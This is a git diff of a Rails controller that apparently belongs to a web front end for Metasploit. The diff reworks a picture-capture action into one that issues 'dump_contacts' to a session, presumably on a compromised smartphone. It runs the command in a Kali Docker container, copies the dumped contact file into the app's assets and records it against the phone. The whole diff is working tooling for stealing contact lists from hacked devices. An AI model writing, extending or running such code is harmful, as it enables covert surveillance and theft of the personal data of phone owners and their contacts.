@@ -7,26 +7,27 @@ class ContactsController < InheritedResources::Base
         currentTime = DateTime.now
         currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
         @fileName= "contacts_dump_" + currentTimeFormat + '.txt'
-        processCommand="dump_contacts -f txt -o #{@fileName}"
+        processCommand="dump_contacts -f text -o #{@fileName}"
         commandOutput=start_msf_process(processCommand)
+        puts commandOutput
 
         1.upto(commandTimeout) do |n|
-            if system("docker exec kali_container ls | grep #{@fileName}")
+            if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
                 break
             else
                 puts "Waiting ..."
             end
             sleep 1
           end
-        copyPictureCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\pictures\\#{@fileName}"
-        system(copyPictureCommand)
+        copyContactsCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\contacts_dumps\\#{@fileName}"
+        system(copyContactsCommand)
 
-        fullPath="app\\assets\\images\\files\\pictures\\" + @fileName
+        fullPath="app\\assets\\images\\files\\contacts_dumps\\" + @fileName
         isOperationSuccessful=false
         1.upto(downloadTimeout) do |n|
             if File.file?(fullPath)
-                newContacts=  Picture.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
-                newPicture.save!
+                newContactsDump=Contact.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
+                newContactsDump.save!
                 isOperationSuccessful = true
                 break
             end 
@@ -34,7 +35,7 @@ class ContactsController < InheritedResources::Base
         commandOutput=["Operation Failed"] if not isOperationSuccessful
 
         respond_to do |format|
-            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
+            format.js { render "dump_contacts", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
           end
     end
 
@@ -43,7 +44,7 @@ class ContactsController < InheritedResources::Base
   private
 
     def contact_params
-      params.require(:contact).permit(:first_name, :last_name, :phone_number, :smartphone_id)
+      params.require(:contact).permit(:date, :filename, :smartphone_id)
     end
 
 end
